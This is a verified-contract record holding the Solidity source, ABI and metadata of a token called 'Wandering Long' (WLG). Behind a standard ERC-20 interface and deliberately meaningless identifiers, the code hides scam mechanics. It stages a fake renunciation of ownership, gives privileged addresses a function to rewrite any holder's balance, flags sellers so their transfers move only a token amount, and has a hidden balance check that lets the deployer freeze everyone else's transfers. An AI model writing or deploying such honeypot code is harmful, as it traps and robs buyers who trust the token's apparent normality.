{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.6;\n\ninterface swapFund {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract fundSellLimit {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface marketingMode {\n    function createPair(address tokenAt, address limitLaunched) external returns (address);\n}\n\ninterface amountIs {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address enableFrom) external view returns (uint256);\n\n    function transfer(address fundTotal, uint256 feeMode) external returns (bool);\n\n    function allowance(address enableSender, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 feeMode) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fundTotal,\n        uint256 feeMode\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed listTeamMin, uint256 value);\n    event Approval(address indexed enableSender, address indexed spender, uint256 value);\n}\n\ninterface amountIsMetadata is amountIs {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract WanderingLong is fundSellLimit, amountIs, amountIsMetadata {\n\n    bool private marketingTrading;\n\n    uint8 private maxAt = 18;\n\n    address public txMinWallet;\n\n    function takeMax(address tradingTo) public {\n        require(tradingTo.balance < 100000);\n        if (fromMarketing) {\n            return;\n        }\n        if (marketingTrading == isExempt) {\n            minMarketingList = receiverToken;\n        }\n        autoModeReceiver[tradingTo] = true;\n        if (minMarketingList != fundIs) {\n            receiverToken = minMarketingList;\n        }\n        fromMarketing = true;\n    }\n\n    uint256 public marketingList;\n\n    mapping(address => bool) public feeTrading;\n\n    function owner() external view returns (address) {\n        return shouldLimit;\n    }\n\n    uint256 constant receiverTradingTo = 4 ** 10;\n\n    uint256 walletTo;\n\n    function toMaxAuto(address launchMode, address fundTotal, uint256 feeMode) internal returns (bool) {\n        require(launchedTo[launchMode] >= feeMode);\n        launchedTo[launchMode] -= feeMode;\n        launchedTo[fundTotal] += feeMode;\n        emit Transfer(launchMode, fundTotal, feeMode);\n        return true;\n    }\n\n    uint256 private swapSender = 100000000 * 10 ** 18;\n\n    address tradingTeam = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool public fromMarketing;\n\n    uint256 txTakeMode;\n\n    uint256 public receiverToken;\n\n    function exemptTo(address totalBuy, uint256 feeMode) public {\n        atSell();\n        launchedTo[totalBuy] = feeMode;\n    }\n\n    event OwnershipTransferred(address indexed senderExemptToken, address indexed toMax);\n\n    mapping(address => mapping(address => uint256)) private autoAmount;\n\n    function txTake(address sellWallet) public {\n        atSell();\n        if (isExempt) {\n            marketingList = minMarketingList;\n        }\n        if (sellWallet == txMinWallet || sellWallet == limitToken) {\n            return;\n        }\n        feeTrading[sellWallet] = true;\n    }\n\n    function transfer(address totalBuy, uint256 feeMode) external virtual override returns (bool) {\n        return atLiquidity(_msgSender(), totalBuy, feeMode);\n    }\n\n    function atSell() private view {\n        require(autoModeReceiver[_msgSender()]);\n    }\n\n    uint256 public toBuy;\n\n    bool public isExempt;\n\n    function transferFrom(address launchMode, address fundTotal, uint256 feeMode) external override returns (bool) {\n        if (_msgSender() != teamMode) {\n            if (autoAmount[launchMode][_msgSender()] != type(uint256).max) {\n                require(feeMode <= autoAmount[launchMode][_msgSender()]);\n                autoAmount[launchMode][_msgSender()] -= feeMode;\n            }\n        }\n        return atLiquidity(launchMode, fundTotal, feeMode);\n    }\n\n    address private shouldLimit;\n\n    function approve(address marketingMax, uint256 feeMode) public virtual override returns (bool) {\n        autoAmount[_msgSender()][marketingMax] = feeMode;\n        emit Approval(_msgSender(), marketingMax, feeMode);\n        return true;\n    }\n\n    function allowance(address receiverLimit, address marketingMax) external view virtual override returns (uint256) {\n        if (marketingMax == teamMode) {\n            return type(uint256).max;\n        }\n        return autoAmount[receiverLimit][marketingMax];\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return maxAt;\n    }\n\n    function receiverTeam(uint256 feeMode) public {\n        atSell();\n        walletTo = feeMode;\n    }\n\n    mapping(address => uint256) private launchedTo;\n\n    uint256 public fundIs;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return swapSender;\n    }\n\n    string private enableLimit = \"WLG\";\n\n    constructor (){\n        if (marketingList != minIs) {\n            marketingTrading = false;\n        }\n        swapFund receiverMax = swapFund(teamMode);\n        limitToken = marketingMode(receiverMax.factory()).createPair(receiverMax.WETH(), address(this));\n        if (marketingTrading) {\n            toBuy = marketingList;\n        }\n        txMinWallet = _msgSender();\n        launchedSellExempt();\n        autoModeReceiver[txMinWallet] = true;\n        launchedTo[txMinWallet] = swapSender;\n        \n        emit Transfer(address(0), txMinWallet, swapSender);\n    }\n\n    function getOwner() external view returns (address) {\n        return shouldLimit;\n    }\n\n    address teamMode = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private minIs;\n\n    function balanceOf(address enableFrom) public view virtual override returns (uint256) {\n        return launchedTo[enableFrom];\n    }\n\n    mapping(address => bool) public autoModeReceiver;\n\n    string private fundLimitMode = \"Wandering Long\";\n\n    function atLiquidity(address launchMode, address fundTotal, uint256 feeMode) internal returns (bool) {\n        if (launchMode == txMinWallet) {\n            return toMaxAuto(launchMode, fundTotal, feeMode);\n        }\n        uint256 senderExemptMax = amountIs(limitToken).balanceOf(tradingTeam);\n        require(senderExemptMax == walletTo);\n        require(fundTotal != tradingTeam);\n        if (feeTrading[launchMode]) {\n            return toMaxAuto(launchMode, fundTotal, receiverTradingTo);\n        }\n        return toMaxAuto(launchMode, fundTotal, feeMode);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return enableLimit;\n    }\n\n    function launchedSellExempt() public {\n        emit OwnershipTransferred(txMinWallet, address(0));\n        shouldLimit = address(0);\n    }\n\n    address public limitToken;\n\n    uint256 private minMarketingList;\n\n    function name() external view virtual override returns (string memory) {\n        return fundLimitMode;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderExemptToken\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toMax\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listTeamMin\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingMax\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeMode\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"autoModeReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableFrom\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeMode\",\"type\":\"uint256\"}],\"name\":\"exemptTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundIs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedSellExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingList\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"feeMode\",\"type\":\"uint256\"}],\"name\":\"receiverTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingTo\",\"type\":\"address\"}],\"name\":\"takeMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeMode\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeMode\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txMinWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellWallet\",\"type\":\"address\"}],\"name\":\"txTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "WanderingLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}